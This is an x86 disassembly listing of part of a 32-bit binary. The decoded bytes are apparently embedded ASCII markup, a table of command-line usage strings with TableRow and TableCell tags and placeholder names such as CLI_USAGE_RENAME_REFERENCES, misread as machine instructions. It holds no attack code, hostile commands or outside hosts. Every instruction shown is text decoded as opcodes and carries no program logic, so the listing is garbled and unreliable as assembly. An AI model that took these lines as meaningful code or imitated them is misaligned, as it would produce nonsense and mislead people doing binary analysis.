1100b6ac:	and    BYTE PTR [eax],ah
1100b6ae:	and    BYTE PTR [edi+ebp*1],bh
1100b6b1:	push   esp
1100b6b2:	popa   
1100b6b3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b6b7:	gs ins BYTE PTR es:[edi],dx
1100b6b9:	ins    BYTE PTR es:[edi],dx
1100b6ba:	ds or  eax,0x2020200a
1100b6c0:	and    BYTE PTR [eax],ah
1100b6c2:	and    BYTE PTR [eax],ah
1100b6c4:	and    BYTE PTR [esp+edx*2],bh
1100b6c7:	popa   
1100b6c8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b6cc:	gs ins BYTE PTR es:[edi],dx
1100b6ce:	ins    BYTE PTR es:[edi],dx
1100b6cf:	ds or  eax,0x2020200a
1100b6d5:	and    BYTE PTR [eax],ah
1100b6d7:	and    BYTE PTR [eax],ah
1100b6d9:	and    BYTE PTR [eax],ah
1100b6db:	and    BYTE PTR [eax+edx*2],bh
1100b6de:	popa   
1100b6df:	jb     0x1100b742
1100b6e1:	addr16 jb 0x1100b745
1100b6e4:	jo     0x1100b74e
1100b6e6:	ds inc ebx
1100b6e8:	dec    esp
1100b6e9:	dec    ecx
1100b6ea:	pop    edi
1100b6eb:	push   ebp
1100b6ec:	push   ebx
1100b6ed:	inc    ecx
1100b6ee:	inc    edi
1100b6ef:	inc    ebp
1100b6f0:	pop    edi
1100b6f1:	inc    ebp
1100b6f2:	dec    esi
1100b6f3:	dec    eax
1100b6f4:	inc    ecx
1100b6f5:	dec    esi
1100b6f6:	inc    ebx
1100b6f7:	inc    ebp
1100b6f8:	inc    esp
1100b6f9:	dec    edi
1100b6fa:	dec    ecx
1100b6fb:	pop    edi
1100b6fc:	dec    edi
1100b6fd:	push   eax
1100b6fe:	push   esp
1100b6ff:	dec    ecx
1100b700:	dec    edi
1100b701:	dec    esi
1100b702:	pop    edi
1100b703:	inc    esp
1100b704:	inc    ebp
1100b705:	push   ebx
1100b706:	inc    ebx
1100b707:	cmp    al,0x2f
1100b709:	push   eax
1100b70a:	popa   
1100b70b:	jb     0x1100b76e
1100b70d:	addr16 jb 0x1100b771
1100b710:	jo     0x1100b77a
1100b712:	ds or  eax,0x2020200a
1100b718:	and    BYTE PTR [eax],ah
1100b71a:	and    BYTE PTR [eax],ah
1100b71c:	and    BYTE PTR [edi+ebp*1],bh
1100b71f:	push   esp
1100b720:	popa   
1100b721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b725:	gs ins BYTE PTR es:[edi],dx
1100b727:	ins    BYTE PTR es:[edi],dx
1100b728:	ds or  eax,0x2020200a
1100b72e:	and    BYTE PTR [eax],ah
1100b730:	and    BYTE PTR [edi+ebp*1],bh
1100b733:	push   esp
1100b734:	popa   
1100b735:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b739:	outs   dx,DWORD PTR ds:[esi]
1100b73a:	ja     0x1100b77a
1100b73c:	or     eax,0x200a0d0a
1100b741:	and    BYTE PTR [eax],ah
1100b743:	and    BYTE PTR [eax],ah
1100b745:	and    BYTE PTR [esp+edx*2],bh
1100b748:	popa   
1100b749:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b74d:	outs   dx,DWORD PTR ds:[esi]
1100b74e:	ja     0x1100b78e
1100b750:	or     eax,0x2020200a
1100b755:	and    BYTE PTR [eax],ah
1100b757:	and    BYTE PTR [eax],ah
1100b759:	and    BYTE PTR [esp+edx*2],bh
1100b75c:	popa   
1100b75d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b761:	gs ins BYTE PTR es:[edi],dx
1100b763:	ins    BYTE PTR es:[edi],dx
1100b764:	ds or  eax,0x2020200a
1100b76a:	and    BYTE PTR [eax],ah
1100b76c:	and    BYTE PTR [eax],ah
1100b76e:	and    BYTE PTR [eax],ah
1100b770:	and    BYTE PTR [eax+edx*2],bh
1100b773:	popa   
1100b774:	jb     0x1100b7d7
1100b776:	addr16 jb 0x1100b7da
1100b779:	jo     0x1100b7e3
1100b77b:	and    BYTE PTR [esi+0x6f],al
1100b77e:	jb     0x1100b7e5
1100b780:	addr16 jb 0x1100b7f2
1100b783:	jne    0x1100b7f3
1100b785:	fs cmp eax,0x756c4222
1100b78b:	and    bh,BYTE PTR gs:[esi]
1100b78e:	inc    ebx
1100b78f:	dec    esp
1100b790:	dec    ecx
1100b791:	pop    edi
1100b792:	push   ebp
1100b793:	push   ebx
1100b794:	inc    ecx
1100b795:	inc    edi
1100b796:	inc    ebp
1100b797:	pop    edi
1100b798:	push   edx
1100b799:	inc    ebp
1100b79a:	dec    esi
1100b79b:	inc    ecx
1100b79c:	dec    ebp
1100b79d:	inc    ebp
1100b79e:	pop    edi
1100b79f:	push   edx
1100b7a0:	inc    ebp
1100b7a1:	inc    esi
1100b7a2:	inc    ebp
1100b7a3:	push   edx
1100b7a4:	inc    ebp
1100b7a5:	dec    esi
1100b7a6:	inc    ebx
1100b7a7:	inc    ebp
1100b7a8:	push   ebx
1100b7a9:	cmp    al,0x2f
1100b7ab:	push   eax
1100b7ac:	popa   
1100b7ad:	jb     0x1100b810
1100b7af:	addr16 jb 0x1100b813
1100b7b2:	jo     0x1100b81c
1100b7b4:	ds or  eax,0x2020200a
1100b7ba:	and    BYTE PTR [eax],ah
1100b7bc:	and    BYTE PTR [eax],ah
1100b7be:	and    BYTE PTR [edi+ebp*1],bh
1100b7c1:	push   esp
1100b7c2:	popa   
1100b7c3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b7c7:	gs ins BYTE PTR es:[edi],dx
1100b7c9:	ins    BYTE PTR es:[edi],dx
1100b7ca:	ds or  eax,0x2020200a
1100b7d0:	and    BYTE PTR [eax],ah
1100b7d2:	and    BYTE PTR [eax],ah
1100b7d4:	and    BYTE PTR [esp+edx*2],bh
1100b7d7:	popa   
1100b7d8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b7dc:	gs ins BYTE PTR es:[edi],dx
1100b7de:	ins    BYTE PTR es:[edi],dx
1100b7df:	ds or  eax,0x2020200a
1100b7e5:	and    BYTE PTR [eax],ah
1100b7e7:	and    BYTE PTR [eax],ah
1100b7e9:	and    BYTE PTR [eax],ah
1100b7eb:	and    BYTE PTR [eax+edx*2],bh
1100b7ee:	popa   
1100b7ef:	jb     0x1100b852
1100b7f1:	addr16 jb 0x1100b855
1100b7f4:	jo     0x1100b85e
1100b7f6:	ds inc ebx
1100b7f8:	dec    esp
1100b7f9:	dec    ecx
1100b7fa:	pop    edi
1100b7fb:	push   ebp
1100b7fc:	push   ebx
1100b7fd:	inc    ecx
1100b7fe:	inc    edi
1100b7ff:	inc    ebp
1100b800:	pop    edi
1100b801:	push   edx
1100b802:	inc    ebp
1100b803:	dec    esi
1100b804:	inc    ecx
1100b805:	dec    ebp
1100b806:	inc    ebp
1100b807:	pop    edi
1100b808:	push   edx
1100b809:	inc    ebp
1100b80a:	inc    esi
1100b80b:	inc    ebp
1100b80c:	push   edx
1100b80d:	inc    ebp
1100b80e:	dec    esi
1100b80f:	inc    ebx
1100b810:	inc    ebp
1100b811:	push   ebx
1100b812:	pop    edi
1100b813:	inc    esp
1100b814:	inc    ebp
1100b815:	push   ebx
1100b816:	inc    ebx
1100b817:	cmp    al,0x2f
1100b819:	push   eax
1100b81a:	popa   
1100b81b:	jb     0x1100b87e
1100b81d:	addr16 jb 0x1100b881
1100b820:	jo     0x1100b88a
1100b822:	ds or  eax,0x2020200a
1100b828:	and    BYTE PTR [eax],ah
1100b82a:	and    BYTE PTR [eax],ah
1100b82c:	and    BYTE PTR [edi+ebp*1],bh
1100b82f:	push   esp
1100b830:	popa   
1100b831:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b835:	gs ins BYTE PTR es:[edi],dx
1100b837:	ins    BYTE PTR es:[edi],dx
1100b838:	ds or  eax,0x2020200a
1100b83e:	and    BYTE PTR [eax],ah
1100b840:	and    BYTE PTR [edi+ebp*1],bh
1100b843:	push   esp
1100b844:	popa   
1100b845:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b849:	outs   dx,DWORD PTR ds:[esi]
1100b84a:	ja     0x1100b88a
1100b84c:	or     eax,0x200a0d0a
1100b851:	and    BYTE PTR [eax],ah
1100b853:	and    BYTE PTR [eax],ah
1100b855:	and    BYTE PTR [esp+edx*2],bh
1100b858:	popa   
1100b859:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b85d:	outs   dx,DWORD PTR ds:[esi]
1100b85e:	ja     0x1100b89e
1100b860:	or     eax,0x2020200a
1100b865:	and    BYTE PTR [eax],ah
1100b867:	and    BYTE PTR [eax],ah
1100b869:	and    BYTE PTR [esp+edx*2],bh
1100b86c:	popa   
1100b86d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b871:	gs ins BYTE PTR es:[edi],dx
1100b873:	ins    BYTE PTR es:[edi],dx
1100b874:	and    BYTE PTR [ebx+0x6f],al
1100b877:	ins    BYTE PTR es:[edi],dx
1100b878:	jne    0x1100b8e7
1100b87a:	outs   dx,BYTE PTR ds:[esi]
1100b87b:	push   ebx
1100b87c:	jo     0x1100b8df
1100b87e:	outs   dx,BYTE PTR ds:[esi]
1100b87f:	cmp    eax,0x3e223222
1100b884:	or     eax,0x2020200a
1100b889:	and    BYTE PTR [eax],ah
1100b88b:	and    BYTE PTR [eax],ah
1100b88d:	and    BYTE PTR [edi+ebp*1],bh
1100b890:	push   esp
1100b891:	popa   
1100b892:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b896:	gs ins BYTE PTR es:[edi],dx
1100b898:	ins    BYTE PTR es:[edi],dx
1100b899:	ds or  eax,0x2020200a
1100b89f:	and    BYTE PTR [eax],ah
1100b8a1:	and    BYTE PTR [edi+ebp*1],bh
1100b8a4:	push   esp
1100b8a5:	popa   
1100b8a6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b8aa:	outs   dx,DWORD PTR ds:[esi]
1100b8ab:	ja     0x1100b8eb
1100b8ad:	or     eax,0x2020200a
1100b8b2:	and    BYTE PTR [edi+ebp*1],bh
1100b8b5:	push   esp
1100b8b6:	popa   
1100b8b7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b8bb:	outs   dx,DWORD PTR ds:[esi]
1100b8bc:	ja     0x1100b905
1100b8be:	jb     0x1100b92f
1100b8c0:	jne    0x1100b932
1100b8c2:	ds or  eax,0xd0a0d0a
1100b8c8:	or     ah,BYTE PTR [eax]
1100b8ca:	and    BYTE PTR [eax],ah
1100b8cc:	and    BYTE PTR [esp+edx*2],bh
1100b8cf:	popa   
1100b8d0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b8d4:	outs   dx,DWORD PTR ds:[esi]
1100b8d5:	ja     0x1100b91e
1100b8d7:	jb     0x1100b948
1100b8d9:	jne    0x1100b94b
1100b8db:	and    BYTE PTR [ebx+0x74],dl
1100b8de:	jns    0x1100b94c
1100b8e0:	gs cmp eax,0x74537b22
1100b8e6:	popa   
1100b8e7:	je     0x1100b952
1100b8e9:	arpl   WORD PTR [edx+0x65],dx
1100b8ec:	jae    0x1100b95d
1100b8ee:	jne    0x1100b962
1100b8f0:	arpl   WORD PTR [ebp+0x20],sp
1100b8f3:	push   0x65646165
1100b8f8:	jb     0x1100b940
1100b8fa:	outs   dx,DWORD PTR ds:[esi]
1100b8fb:	outs   dx,DWORD PTR ds:[esi]
1100b8fc:	je     0x1100b963
1100b8fe:	jb     0x1100b952
1100b900:	outs   dx,DWORD PTR ds:[esi]
1100b901:	ja     0x1100b956
1100b903:	je     0x1100b97e
1100b905:	ins    BYTE PTR es:[edi],dx
1100b906:	gs jge 0x1100b92b
1100b909:	ds or  eax,0x2020200a
1100b90f:	and    BYTE PTR [eax],ah
1100b911:	and    BYTE PTR [esp+edx*2],bh
1100b914:	popa   
1100b915:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b919:	outs   dx,DWORD PTR ds:[esi]
1100b91a:	ja     0x1100b95a
1100b91c:	or     eax,0x2020200a
1100b921:	and    BYTE PTR [eax],ah
1100b923:	and    BYTE PTR [eax],ah
1100b925:	and    BYTE PTR [esp+edx*2],bh
1100b928:	popa   
1100b929:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b92d:	gs ins BYTE PTR es:[edi],dx
1100b92f:	ins    BYTE PTR es:[edi],dx
1100b930:	and    BYTE PTR [ebx+0x6f],al
1100b933:	ins    BYTE PTR es:[edi],dx
1100b934:	jne    0x1100b9a3
1100b936:	outs   dx,BYTE PTR ds:[esi]
1100b937:	push   ebx
1100b938:	jo     0x1100b99b
1100b93a:	outs   dx,BYTE PTR ds:[esi]
1100b93b:	cmp    eax,0x3e223222
1100b940:	or     eax,0x2020200a
1100b945:	and    BYTE PTR [eax],ah
1100b947:	and    BYTE PTR [eax],ah
1100b949:	and    BYTE PTR [eax],ah
1100b94b:	and    BYTE PTR [eax+edx*2],bh
1100b94e:	popa   
1100b94f:	jb     0x1100b9b2
1100b951:	addr16 jb 0x1100b9b5
1100b954:	jo     0x1100b9be
1100b956:	ds inc ebx
1100b958:	dec    esp
1100b959:	dec    ecx
1100b95a:	pop    edi
1100b95b:	push   ebp
1100b95c:	push   ebx
1100b95d:	inc    ecx
1100b95e:	inc    edi
1100b95f:	inc    ebp
1100b960:	pop    edi
1100b961:	inc    ebp
1100b962:	pop    eax
1100b963:	push   esp
1100b964:	pop    edi
1100b965:	inc    ebx
1100b966:	dec    edi
1100b967:	dec    esi
1100b968:	push   esp
1100b969:	push   edx
1100b96a:	dec    edi
1100b96b:	dec    esp
1100b96c:	inc    esi
1100b96d:	dec    esp
1100b96e:	dec    edi
1100b96f:	push   edi
1100b970:	pop    edi
1100b971:	dec    edi
1100b972:	push   eax
1100b973:	push   esp
1100b974:	dec    ecx
1100b975:	dec    edi
1100b976:	dec    esi
1100b977:	push   ebx
1100b978:	cmp    al,0x2f
1100b97a:	push   eax
1100b97b:	popa   
1100b97c:	jb     0x1100b9df
1100b97e:	addr16 jb 0x1100b9e2
1100b981:	jo     0x1100b9eb
1100b983:	ds or  eax,0x2020200a
1100b989:	and    BYTE PTR [eax],ah
1100b98b:	and    BYTE PTR [eax],ah
1100b98d:	and    BYTE PTR [edi+ebp*1],bh
1100b990:	push   esp
1100b991:	popa   
1100b992:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b996:	gs ins BYTE PTR es:[edi],dx
1100b998:	ins    BYTE PTR es:[edi],dx
1100b999:	ds or  eax,0x2020200a
1100b99f:	and    BYTE PTR [eax],ah
1100b9a1:	and    BYTE PTR [edi+ebp*1],bh
1100b9a4:	push   esp
1100b9a5:	popa   
1100b9a6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b9aa:	outs   dx,DWORD PTR ds:[esi]
1100b9ab:	ja     0x1100b9eb
1100b9ad:	or     eax,0x2020200a
1100b9b2:	and    BYTE PTR [edi+ebp*1],bh
1100b9b5:	push   esp
1100b9b6:	popa   
1100b9b7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b9bb:	outs   dx,DWORD PTR ds:[esi]
1100b9bc:	ja     0x1100ba05
1100b9be:	jb     0x1100ba2f
1100b9c0:	jne    0x1100ba32
1100b9c2:	ds or  eax,0x200a0d0a
1100b9c8:	and    BYTE PTR [eax],ah
1100b9ca:	and    BYTE PTR [esp+edx*2],bh
1100b9cd:	popa   
1100b9ce:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b9d2:	outs   dx,DWORD PTR ds:[esi]
1100b9d3:	ja     0x1100ba1c
1100b9d5:	jb     0x1100ba46
1100b9d7:	jne    0x1100ba49
1100b9d9:	and    BYTE PTR [ebx+0x74],dl
1100b9dc:	jns    0x1100ba4a
1100b9de:	gs cmp eax,0x74537b22
1100b9e4:	popa   
1100b9e5:	je     0x1100ba50
1100b9e7:	arpl   WORD PTR [edx+0x65],dx
1100b9ea:	jae    0x1100ba5b
1100b9ec:	jne    0x1100ba60
1100b9ee:	arpl   WORD PTR [ebp+0x20],sp
1100b9f1:	fs popa 
1100b9f3:	je     0x1100ba56
1100b9f5:	push   edx
1100b9f6:	outs   dx,DWORD PTR ds:[esi]
1100b9f7:	ja     0x1100ba4c
1100b9f9:	je     0x1100ba74
1100b9fb:	ins    BYTE PTR es:[edi],dx
1100b9fc:	gs jge 0x1100ba21
1100b9ff:	ds or  eax,0x2020200a
1100ba05:	and    BYTE PTR [eax],ah
1100ba07:	and    BYTE PTR [esp+edx*2],bh
1100ba0a:	popa   
1100ba0b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ba0f:	outs   dx,DWORD PTR ds:[esi]
1100ba10:	ja     0x1100ba50
1100ba12:	or     eax,0x2020200a
1100ba17:	and    BYTE PTR [eax],ah
1100ba19:	and    BYTE PTR [eax],ah
1100ba1b:	and    BYTE PTR [esp+edx*2],bh
1100ba1e:	popa   
1100ba1f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ba23:	gs ins BYTE PTR es:[edi],dx
1100ba25:	ins    BYTE PTR es:[edi],dx
1100ba26:	ds or  eax,0x2020200a
1100ba2c:	and    BYTE PTR [eax],ah
1100ba2e:	and    BYTE PTR [eax],ah
1100ba30:	and    BYTE PTR [eax],ah
1100ba32:	and    BYTE PTR [eax+edx*2],bh
1100ba35:	popa   
1100ba36:	jb     0x1100ba99
1100ba38:	addr16 jb 0x1100ba9c
1100ba3b:	jo     0x1100baa5
1100ba3d:	and    BYTE PTR [esi+0x6f],al
1100ba40:	jb     0x1100baa7
1100ba42:	addr16 jb 0x1100bab4
1100ba45:	jne    0x1100bab5
1100ba47:	fs cmp eax,0x756c4222
1100ba4d:	and    bh,BYTE PTR gs:[esi]
1100ba50:	inc    ebx
1100ba51:	dec    esp
1100ba52:	dec    ecx
1100ba53:	pop    edi
1100ba54:	push   ebp
1100ba55:	push   ebx
1100ba56:	inc    ecx
1100ba57:	inc    edi
1100ba58:	inc    ebp
1100ba59:	pop    edi
1100ba5a:	inc    ebx
1100ba5b:	dec    edi
1100ba5c:	dec    esi
1100ba5d:	push   esp
1100ba5e:	push   edx
1100ba5f:	dec    edi
1100ba60:	dec    esp
1100ba61:	inc    esi
1100ba62:	dec    esp
1100ba63:	dec    edi
1100ba64:	push   edi
1100ba65:	pop    edi
1100ba66:	dec    edi
1100ba67:	push   eax
1100ba68:	push   esp
1100ba69:	dec    ecx
1100ba6a:	dec    edi
1100ba6b:	dec    esi
1100ba6c:	cmp    al,0x2f
1100ba6e:	push   eax
1100ba6f:	popa   
1100ba70:	jb     0x1100bad3
1100ba72:	addr16 jb 0x1100bad6
1100ba75:	jo     0x1100badf
1100ba77:	ds or  eax,0x2020200a
1100ba7d:	and    BYTE PTR [eax],ah
1100ba7f:	and    BYTE PTR [eax],ah
1100ba81:	and    BYTE PTR [edi+ebp*1],bh
1100ba84:	push   esp
1100ba85:	popa   
1100ba86:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ba8a:	gs ins BYTE PTR es:[edi],dx
1100ba8c:	ins    BYTE PTR es:[edi],dx
1100ba8d:	ds or  eax,0x2020200a
1100ba93:	and    BYTE PTR [eax],ah
1100ba95:	and    BYTE PTR [eax],ah
1100ba97:	and    BYTE PTR [esp+edx*2],bh
1100ba9a:	popa   
1100ba9b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ba9f:	gs ins BYTE PTR es:[edi],dx
1100baa1:	ins    BYTE PTR es:[edi],dx
1100baa2:	ds or  eax,0x2020200a
1100baa8:	and    BYTE PTR [eax],ah
1100baaa:	and    BYTE PTR [eax],ah
1100baac:	and    BYTE PTR [eax],ah
1100baae:	and    BYTE PTR [eax+edx*2],bh
1100bab1:	popa   
1100bab2:	jb     0x1100bb15
1100bab4:	addr16 jb 0x1100bb18
1100bab7:	jo     0x1100bb21
1100bab9:	ds inc ebx
1100babb:	dec    esp
1100babc:	dec    ecx
1100babd:	pop    edi
1100babe:	push   ebp
1100babf:	push   ebx
1100bac0:	inc    ecx
1100bac1:	inc    edi
1100bac2:	inc    ebp
1100bac3:	pop    edi
1100bac4:	inc    ebx
1100bac5:	dec    edi
1100bac6:	dec    esi
1100bac7:	push   esp
1100bac8:	push   edx
1100bac9:	dec    edi
1100baca:	dec    esp
1100bacb:	inc    esi
1100bacc:	dec    esp
1100bacd:	dec    edi
1100bace:	push   edi
1100bacf:	pop    edi
1100bad0:	dec    edi
1100bad1:	push   eax
1100bad2:	push   esp
1100bad3:	dec    ecx
1100bad4:	dec    edi
1100bad5:	dec    esi
1100bad6:	pop    edi
1100bad7:	inc    esp
1100bad8:	inc    ebp
1100bad9:	push   ebx
1100bada:	inc    ebx
1100badb:	cmp    al,0x2f
1100badd:	push   eax
1100bade:	popa   
1100badf:	jb     0x1100bb42
1100bae1:	addr16 jb 0x1100bb45
1100bae4:	jo     0x1100bb4e
1100bae6:	ds or  eax,0x2020200a
1100baec:	and    BYTE PTR [eax],ah
1100baee:	and    BYTE PTR [eax],ah
1100baf0:	and    BYTE PTR [edi+ebp*1],bh
1100baf3:	push   esp
1100baf4:	popa   
1100baf5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100baf9:	gs ins BYTE PTR es:[edi],dx
1100bafb:	ins    BYTE PTR es:[edi],dx
1100bafc:	ds or  eax,0x2020200a
1100bb02:	and    BYTE PTR [eax],ah
1100bb04:	and    BYTE PTR [edi+ebp*1],bh
1100bb07:	push   esp
1100bb08:	popa   
1100bb09:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bb0d:	outs   dx,DWORD PTR ds:[esi]
1100bb0e:	ja     0x1100bb4e
1100bb10:	or     eax,0x200a0d0a
1100bb15:	and    BYTE PTR [eax],ah
1100bb17:	and    BYTE PTR [eax],ah
1100bb19:	and    BYTE PTR [esp+edx*2],bh
1100bb1c:	popa   
1100bb1d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bb21:	outs   dx,DWORD PTR ds:[esi]
1100bb22:	ja     0x1100bb62
1100bb24:	or     eax,0x2020200a
1100bb29:	and    BYTE PTR [eax],ah
1100bb2b:	and    BYTE PTR [eax],ah
1100bb2d:	and    BYTE PTR [esp+edx*2],bh
1100bb30:	popa   
1100bb31:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bb35:	gs ins BYTE PTR es:[edi],dx
1100bb37:	ins    BYTE PTR es:[edi],dx
1100bb38:	and    BYTE PTR [ebx+0x6f],al
1100bb3b:	ins    BYTE PTR es:[edi],dx
1100bb3c:	jne    0x1100bbab
1100bb3e:	outs   dx,BYTE PTR ds:[esi]
1100bb3f:	push   ebx
1100bb40:	jo     0x1100bba3
1100bb42:	outs   dx,BYTE PTR ds:[esi]
1100bb43:	cmp    eax,0x3e223222
1100bb48:	or     eax,0x2020200a
1100bb4d:	and    BYTE PTR [eax],ah
1100bb4f:	and    BYTE PTR [eax],ah
1100bb51:	and    BYTE PTR [edi+ebp*1],bh
1100bb54:	push   esp
1100bb55:	popa   
1100bb56:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bb5a:	gs ins BYTE PTR es:[edi],dx
1100bb5c:	ins    BYTE PTR es:[edi],dx
1100bb5d:	ds or  eax,0x2020200a
1100bb63:	and    BYTE PTR [eax],ah
1100bb65:	and    BYTE PTR [edi+ebp*1],bh
1100bb68:	push   esp
1100bb69:	popa   
1100bb6a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bb6e:	outs   dx,DWORD PTR ds:[esi]
1100bb6f:	ja     0x1100bbaf
1100bb71:	or     eax,0x2020200a
1100bb76:	and    BYTE PTR [edi+ebp*1],bh
1100bb79:	push   esp
1100bb7a:	popa   
1100bb7b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bb7f:	outs   dx,DWORD PTR ds:[esi]
1100bb80:	ja     0x1100bbc9
1100bb82:	jb     0x1100bbf3
1100bb84:	jne    0x1100bbf6
1100bb86:	ds or  eax,0x200a0d0a
1100bb8c:	and    BYTE PTR [eax],ah
1100bb8e:	and    BYTE PTR [esp+edx*2],bh
1100bb91:	popa   
1100bb92:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bb96:	outs   dx,DWORD PTR ds:[esi]
1100bb97:	ja     0x1100bbe0
1100bb99:	jb     0x1100bc0a
1100bb9b:	jne    0x1100bc0d
1100bb9d:	and    BYTE PTR [ebx+0x74],dl
1100bba0:	jns    0x1100bc0e
1100bba2:	gs cmp eax,0x74537b22
1100bba8:	popa   
1100bba9:	je     0x1100bc14
1100bbab:	arpl   WORD PTR [edx+0x65],dx
1100bbae:	jae    0x1100bc1f
1100bbb0:	jne    0x1100bc24
1100bbb2:	arpl   WORD PTR [ebp+0x20],sp
1100bbb5:	push   0x65646165
1100bbba:	jb     0x1100bc02
1100bbbc:	outs   dx,DWORD PTR ds:[esi]
1100bbbd:	outs   dx,DWORD PTR ds:[esi]
1100bbbe:	je     0x1100bc25
1100bbc0:	jb     0x1100bc14
1100bbc2:	outs   dx,DWORD PTR ds:[esi]
1100bbc3:	ja     0x1100bc18
1100bbc5:	je     0x1100bc40
1100bbc7:	ins    BYTE PTR es:[edi],dx
1100bbc8:	gs jge 0x1100bbed
1100bbcb:	ds or  eax,0x2020200a
1100bbd1:	and    BYTE PTR [eax],ah
1100bbd3:	and    BYTE PTR [esp+edx*2],bh
1100bbd6:	popa   
1100bbd7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bbdb:	outs   dx,DWORD PTR ds:[esi]
1100bbdc:	ja     0x1100bc1c
1100bbde:	or     eax,0x2020200a
1100bbe3:	and    BYTE PTR [eax],ah
1100bbe5:	and    BYTE PTR [eax],ah
1100bbe7:	and    BYTE PTR [esp+edx*2],bh
1100bbea:	popa   
1100bbeb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bbef:	gs ins BYTE PTR es:[edi],dx
1100bbf1:	ins    BYTE PTR es:[edi],dx
1100bbf2:	and    BYTE PTR [ebx+0x6f],al
1100bbf5:	ins    BYTE PTR es:[edi],dx
1100bbf6:	jne    0x1100bc65
1100bbf8:	outs   dx,BYTE PTR ds:[esi]
1100bbf9:	push   ebx
1100bbfa:	jo     0x1100bc5d
1100bbfc:	outs   dx,BYTE PTR ds:[esi]
1100bbfd:	cmp    eax,0x3e223222
1100bc02:	or     eax,0x2020200a
1100bc07:	and    BYTE PTR [eax],ah
1100bc09:	and    BYTE PTR [eax],ah
1100bc0b:	and    BYTE PTR [eax],ah
1100bc0d:	and    BYTE PTR [eax+edx*2],bh
1100bc10:	popa   
1100bc11:	jb     0x1100bc74
1100bc13:	addr16 jb 0x1100bc77
1100bc16:	jo     0x1100bc80
1100bc18:	ds inc ebx
1100bc1a:	dec    esp
1100bc1b:	dec    ecx
1100bc1c:	pop    edi
1100bc1d:	push   ebp
1100bc1e:	push   ebx
1100bc1f:	inc    ecx
1100bc20:	inc    edi
1100bc21:	inc    ebp
1100bc22:	pop    edi
1100bc23:	inc    ebp
1100bc24:	pop    eax
1100bc25:	push   esp
1100bc26:	pop    edi
1100bc27:	inc    ebp
1100bc28:	dec    esi
1100bc29:	inc    ebx
1100bc2a:	push   edx
1100bc2b:	pop    ecx
1100bc2c:	push   eax
1100bc2d:	push   esp
1100bc2e:	dec    ecx
1100bc2f:	dec    edi
1100bc30:	dec    esi
1100bc31:	pop    edi
1100bc32:	dec    edi
1100bc33:	push   eax
1100bc34:	push   esp
1100bc35:	dec    ecx
1100bc36:	dec    edi
1100bc37:	dec    esi
1100bc38:	push   ebx
1100bc39:	cmp    al,0x2f
1100bc3b:	push   eax
1100bc3c:	popa   
1100bc3d:	jb     0x1100bca0
1100bc3f:	addr16 jb 0x1100bca3
1100bc42:	jo     0x1100bcac
1100bc44:	ds or  eax,0x2020200a
1100bc4a:	and    BYTE PTR [eax],ah
1100bc4c:	and    BYTE PTR [eax],ah
1100bc4e:	and    BYTE PTR [edi+ebp*1],bh
1100bc51:	push   esp
1100bc52:	popa   
1100bc53:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bc57:	gs ins BYTE PTR es:[edi],dx
1100bc59:	ins    BYTE PTR es:[edi],dx
1100bc5a:	ds or  eax,0x2020200a
1100bc60:	and    BYTE PTR [eax],ah
1100bc62:	and    BYTE PTR [edi+ebp*1],bh
1100bc65:	push   esp
1100bc66:	popa   
1100bc67:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bc6b:	outs   dx,DWORD PTR ds:[esi]
1100bc6c:	ja     0x1100bcac
1100bc6e:	or     eax,0x2020200a
1100bc73:	and    BYTE PTR [edi+ebp*1],bh
1100bc76:	push   esp
1100bc77:	popa   
1100bc78:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bc7c:	outs   dx,DWORD PTR ds:[esi]
1100bc7d:	ja     0x1100bcc6
1100bc7f:	jb     0x1100bcf0
1100bc81:	jne    0x1100bcf3
1100bc83:	ds or  eax,0x2020200a
1100bc89:	and    BYTE PTR ds:0x2020200a,cl
1100bc8f:	and    BYTE PTR [esp+edx*2],bh
1100bc92:	popa   
1100bc93:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bc97:	outs   dx,DWORD PTR ds:[esi]
1100bc98:	ja     0x1100bce1
1100bc9a:	jb     0x1100bd0b
1100bc9c:	jne    0x1100bd0e
1100bc9e:	and    BYTE PTR [ebx+0x74],dl
1100bca1:	jns    0x1100bd0f
1100bca3:	gs cmp eax,0x74537b22
1100bca9:	popa   
1100bcaa:	je     0x1100bd15
